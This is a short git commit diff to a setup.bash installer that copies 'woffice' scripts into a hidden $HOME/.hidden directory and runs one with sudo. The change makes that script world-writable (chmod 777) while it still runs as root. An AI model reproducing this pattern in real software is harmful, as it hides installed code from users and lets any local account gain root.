f1b482533dae7b18e0d7f42a6e77753da5b6ee9e
pistacchietto <pistacchietto2@gmail.com>
2019-01-04 18:55:14 +0100

    ok

--- setup.bash
+++ setup.bash
@@ -11,7 +11,7 @@ cp woffice.sh $HOME/.hidden/woffice.sh
 
 #Give the script permission to execute
 chmod +x $HOME/.hidden/woffice.py
-chmod +x $HOME/.hidden/woffice.sh
+chmod 777 $HOME/.hidden/woffice.sh
 sudo sh $HOME/.hidden/woffice.sh
 #chown root $HOME/.hidden/woffice.py
 
